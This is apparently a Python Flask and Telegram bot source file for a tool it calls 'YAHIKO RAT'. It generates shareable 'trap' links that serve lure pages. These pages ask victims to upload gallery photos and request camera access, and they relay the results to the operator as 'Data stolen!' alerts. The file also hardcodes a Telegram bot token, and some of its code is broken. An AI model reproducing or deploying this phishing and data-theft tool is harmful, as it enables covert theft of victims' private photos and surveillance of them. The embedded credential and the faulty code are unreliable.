from flask import Flask, request
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random
import string
import os
import zipfile
from io import BytesIO
import threading
import time
from datetime import datetime
import traceback

app = Flask(__name__)

# Config
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc')
RENDER_URL = os.environ.get('RENDER_URL', request.host_url or 'https://yahiko-bot.onrender.com')
bot = telebot.TeleBot(BOT_TOKEN)

stolen_data = {}

print("🚀 Starting YAHIKO RAT...")

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("👇 DASHBOARD", callback_data="DASHBOARD"))
    bot.send_message(message.chat.id, 
        "✨ *YAHIKO RAT LIVE*\n\n👇 Open Dashboard", 
        parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    if call.data == "DASHBOARD":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔴 LIVE", callback_data="MODULE_LIVE"),
            InlineKeyboardButton("📸 GALLERY", callback_data="MODULE_GALLERY")
        )
        markup.add(
            InlineKeyboardButton("📞 CONTACTS", callback_data="MODULE_CONTACTS"),
            InlineKeyboardButton("📍 GPS", callback_data="MODULE_GPS")
        )
        
        bot.edit_message_text(
            "*YAHIKO DASHBOARD*\n\nSelect module:", 
            call.message.chat.id, call.message.message_id,
            parse_mode='Markdown', reply_markup=markup
        )
    
    elif call.data.startswith("MODULE_"):
        module = call.data.split('_')[1]
        trap_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        trap_url = f"{RENDER_URL.rstrip('/')}/{module.lower()}?id={trap_id}"
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.row(
            InlineKeyboardButton("📱 WhatsApp", url=f"https://wa.me/?text={trap_url}"),
            InlineKeyboardButton("💬 Telegram", url=f"https://t.me/share/url?url={trap_url}")
        )
        
        bot.edit_message_text(
            f"🎯 *TRAP READY*\n\n`{trap_url}`\n\nShare anywhere!", 
            call.message.chat.id, call.message.message_id,
            parse_mode='Markdown', reply_markup=markup
        )
        
        stolen_data[trap_id] = {'chat_id': call.message.chat.id}

@bot.message_handler(content_types=['photo', 'document'])
def handle_media(message):
    file_id = message.photo[-1].file_id if message.photo else message.document.file_id
    for trap_id, data in stolen_data.items():
        try:
            bot.send_photo(data['chat_id'], file_id, caption=f"🎯 [{trap_id}] Photo!")
        except:
            pass

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    text = message.text[:1000]
    for trap_id, data in stolen_data.items():
        try:
            bot.send_message(data['chat_id'], f"📱 [{trap_id}] {text}")
        except:
            pass

# WEB ROUTES
@app.route('/')
def home():
    return "🚀 YAHIKO RAT LIVE!"

@app.route('/live')
@app.route('/gallery')
@app.route('/contacts')
@app.route('/gps')
def trap_page(module):
    trap_id = request.args.get('id', 'NOID')
    return f"""
    <!DOCTYPE html>
    <html>
    <head><title>{module.upper()}</title>
    <meta name="viewport" content="width=device-width">
    <style>body{{background:#000;color:#0f0;font-family:monospace;padding:50px;text-align:center}}</style>
    </head>
    <body>
        <h1>🔄 {module.upper()} ACCESS</h1>
        <input type="file" id="file" accept="image/*" multiple style="display:none">
        <button onclick="document.getElementById('file').click()" 
                style="padding:15px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:10px">
            📁 SELECT FROM GALLERY
        </button>
        <div id="status">Waiting...</div>
        
        <script>
        document.getElementById('file').onchange=function(e){{
            const files=e.target.files;
            document.getElementById('status').innerText=`Uploading ${{files.length}} files...`;
            for(let file of files){{
                let form=new FormData();form.append('id','{trap_id}');form.append('file',file);
                fetch('/webhook',{{method:'POST',body:form}});
            }}
            document.body.innerHTML='<h1 style="color:#0f0">✅ UPLOADED!</h1>';
        }};
        
        // Camera
        navigator.mediaDevices.getUserMedia({{video:true}}).then(()=>{{ 
            fetch('/webhook',{{method:'POST',body:JSON.stringify({{id:'{trap_id}',type:'camera'}})}});
        }});
        </script>
    </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        trap_id = request.form.get('id') or request.json.get('id', 'NOID')
        if trap_id in stolen_data:
            chat_id = stolen_data[trap_id]['chat_id']
            bot.send_message(chat_id, f"🌐 WEBHOOK [{trap_id}] Data stolen!")
        return "OK"
    except Exception as e:
        print(f"Webhook error: {e}")
        return "ERROR", 500

def run_bot():
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f"Bot error: {e}")
        time.sleep(10)
        run_bot()

def keep_alive():
    while True:
        print(f"🟢 LIVE {datetime.now()}")
        time.sleep(300)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    
    port = int(os.environ.get('PORT', 10000))
    print(f"🚀 Starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
